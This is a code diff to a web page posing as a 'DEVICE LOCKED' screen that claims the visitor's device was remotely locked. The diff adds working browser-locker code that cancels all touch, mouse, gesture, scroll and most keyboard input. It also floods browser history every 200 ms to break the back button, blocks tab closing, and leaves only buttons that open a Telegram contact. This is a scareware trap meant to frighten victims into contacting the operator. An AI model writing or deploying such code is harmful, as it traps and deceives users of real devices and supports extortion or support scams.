@@ -11,20 +11,26 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000000;
+            touch-action: none;
         }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #000000;
-            min-height: 100vh;
             color: white;
-            overflow: hidden;
-            position: fixed;
-            width: 100%;
-            height: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
-            touch-action: none;
         }
         .container {
             max-width: 450px;
@@ -103,10 +109,12 @@
         }
         .fullscreen-btn:active { transform: scale(0.95); }
         .fullscreen-btn.hidden { display: none; }
+        /* Disable all pointer events on everything except buttons */
+        .no-click { pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="mainContainer">
         <div class="lock-icon">💀</div>
         <h1>🔒 DEVICE LOCKED</h1>
         <div class="sub">Your device has been remotely locked</div>
@@ -155,81 +163,123 @@
             enterFullscreen();
         });
 
-        // ========== ENABLE LOCK AFTER FULLSCREEN ==========
+        // ========== ENABLE COMPLETE LOCK ==========
         function enableLock() {
             if (lockEnabled) return;
             lockEnabled = true;
 
-            // Block back button - PUSH MULTIPLE
-            for(let i = 0; i < 10; i++) {
-                window.history.pushState(null, '', window.location.href);
-            }
-            window.addEventListener('popstate', function() {
-                for(let i = 0; i < 10; i++) {
-                    window.history.pushState(null, '', window.location.href);
-                }
-                alert('🔒 Cannot exit! Contact admin.');
-            });
-
-            // Block tab close warning
-            window.addEventListener('beforeunload', function(e) {
+            // ===== BLOCK ALL TOUCH EVENTS COMPLETELY =====
+            document.addEventListener('touchstart', function(e) {
                 e.preventDefault();
-                e.returnValue = '🔒 Device locked! Contact admin to exit.';
-                return '🔒 Device locked! Contact admin to exit.';
-            });
+                e.stopPropagation();
+                return false;
+            }, { passive: false, capture: true });
 
-            // Block ALL keyboard shortcuts
+            document.addEventListener('touchmove', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { passive: false, capture: true });
+
+            document.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { passive: false, capture: true });
+
+            document.addEventListener('touchcancel', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { passive: false, capture: true });
+
+            // ===== BLOCK ALL MOUSE EVENTS =====
+            document.addEventListener('mousedown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { capture: true });
+
+            document.addEventListener('mouseup', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { capture: true });
+
+            document.addEventListener('click', function(e) {
+                // Allow clicks on contact buttons only
+                if (e.target.id === 'contactBtn' || e.target.id === 'ownerLink') {
+                    return;
+                }
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { capture: true });
+
+            // ===== BLOCK KEYBOARD =====
             document.addEventListener('keydown', function(e) {
-                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'Meta', 'Alt', 'Tab'];
+                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab'];
                 if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                     e.preventDefault();
                     e.stopPropagation();
                     alert('🔒 Action blocked! Contact admin.');
                     return false;
                 }
-            });
+            }, { capture: true });
 
-            // Block ALL touch swipes - COMPLETE BLOCK
-            let touchStartX = 0, touchStartY = 0;
-            document.addEventListener('touchstart', function(e) {
-                touchStartX = e.touches[0].clientX;
-                touchStartY = e.touches[0].clientY;
-            }, { passive: true });
-
-            document.addEventListener('touchmove', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }, { passive: false });
-
-            document.addEventListener('touchend', function(e) {
-                const dx = e.changedTouches[0].clientX - touchStartX;
-                const dy = e.changedTouches[0].clientY - touchStartY;
-                if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    alert('🔒 Swipe blocked! Contact admin.');
-                    return false;
+            // ===== BLOCK BACK BUTTON =====
+            for(let i = 0; i < 20; i++) {
+                window.history.pushState(null, '', window.location.href);
+            }
+            window.addEventListener('popstate', function() {
+                for(let i = 0; i < 20; i++) {
+                    window.history.pushState(null, '', window.location.href);
                 }
+                alert('🔒 Cannot exit! Contact admin.');
             });
 
-            // Block context menu (long press)
+            // ===== BLOCK TAB CLOSE =====
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '🔒 Device locked! Contact admin to exit.';
+                return '🔒 Device locked! Contact admin to exit.';
+            });
+
+            // ===== BLOCK CONTEXT MENU =====
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
-            });
+            }, { capture: true });
 
-            // Block wheel/scroll
+            // ===== BLOCK WHEEL/SCROLL =====
             document.addEventListener('wheel', function(e) {
                 e.preventDefault();
-            }, { passive: false });
+            }, { passive: false, capture: true });
 
-            // Continuous history push
+            // ===== CONTINUOUS HISTORY PUSH =====
             setInterval(function() {
                 if (lockEnabled) {
                     window.history.pushState(null, '', window.location.href);
                 }
             }, 200);
+
+            // ===== BLOCK GESTURE EVENTS =====
+            document.addEventListener('gesturestart', function(e) {
+                e.preventDefault();
+                return false;
+            }, { passive: false, capture: true });
+
+            document.addEventListener('gesturechange', function(e) {
+                e.preventDefault();
+                return false;
+            }, { passive: false, capture: true });
+
+            document.addEventListener('gestureend', function(e) {
+                e.preventDefault();
+                return false;
+            }, { passive: false, capture: true });
+
+            console.log('🔒 Full lock enabled!');
         }
 
         // ========== CHECK UNLOCK ==========
@@ -250,12 +300,12 @@
 
         // ========== CONTACT ADMIN ==========
         document.getElementById('contactBtn').addEventListener('click', function(e) {
-            e.preventDefault();
+            e.stopPropagation();
             window.open('https://t.me/notxsatvir', '_blank');
         });
 
         document.getElementById('ownerLink').addEventListener('click', function(e) {
-            e.preventDefault();
+            e.stopPropagation();
             window.open('https://t.me/notxsatvir', '_blank');
         });
 
